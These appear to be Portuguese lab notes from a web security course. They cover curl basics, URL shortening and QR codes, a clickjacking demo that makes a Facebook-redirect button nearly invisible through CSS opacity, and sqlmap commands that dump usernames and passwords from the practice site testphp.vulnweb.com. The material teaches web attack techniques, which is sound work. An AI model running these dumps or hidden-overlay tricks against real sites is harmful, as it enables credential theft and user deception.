# 6.6

````
curl https://www.example.com

curl -o output.html https://www.example.com

curl "https://www.google.com/search?q=Ol%C3%A1%2C%20mundo%21"
````

Acessa via Web navegador

https://www.google.com/search?q=Ol%C3%A1%2C%20mundo%21


# 6.7

```
curl -s -i https://tinyurl.com/api-create.php?url=https://esr.rnp.br/cursos/?_formacao_cursos=seguranca 
```
Abra o Mozilla Firefox

```
https://tinyurl.com/27ldrg4o
qrencode -o qr_code.png "https://tinyurl.com/27ldrg4o"
```

#  6.8


* Abra o arquivo “teste.html” (clique 2 vezes nele) e veja que não há texto visível no site aberto pelo Firefox.


* Volte ao arquivo de texto no item 2 (Mousepad) e mude a linha que contém “opacity: 0;” por “opacity: 0.5;”. Salve o arquivo (Ctrl + S) e recarregue o site no Mozilla Firefox. Veja que agora o elemento oculto que reencaminha ao Facebook é parcialmente visível (botão “Click here!”) e ainda conta com uma proteção do Firefox para não abrir o link do Facebook.


* Volte ao arquivo de texto no item 2 e mude a linha que contém “opacity: 0.5;” por “opacity: 0.03;”. Salve o arquivo (Ctrl + S) e recarregue o site no Mozilla Firefox. Veja que agora o elemento oculto que reencaminha ao Facebook é praticamente invisível, ainda conta com a proteção, mas pode ser aberto por um usuário descuidado clicando ao lado direito do botão.


# 6*9 

* Agora, vamos testar o site “esr.rnp.br” (copie e cole). Os resultados foram:


* Em seguida, vamos testar o site “www.hackthissite.org” (copie e cole). Os resultados foram


# 6.10

```
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 –dbs   
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –tables
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –columns
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass –dump 

```
        ___